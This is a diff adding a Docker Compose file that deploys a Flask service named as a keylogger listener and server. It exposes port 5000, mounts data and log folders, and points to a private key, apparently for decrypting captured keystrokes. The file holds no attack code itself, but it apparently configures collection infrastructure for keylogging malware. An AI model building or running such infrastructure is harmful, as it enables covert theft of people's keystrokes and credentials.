@@ -1,0 +1,16 @@
+version: '3.8'
+
+services:
+  keylogger-listener:
+    build: .
+    ports:
+      - "5000:5000"
+    volumes:
+      - ./data:/app/data
+      - ./logs:/app/logs
+      - ../keypair:/app/keypair:ro
+    environment:
+      - FLASK_ENV=production
+      - PRIVATE_KEY_PATH=/app/keypair/keylogger_private.pem
+    restart: unless-stopped
+    container_name: keylogger-server
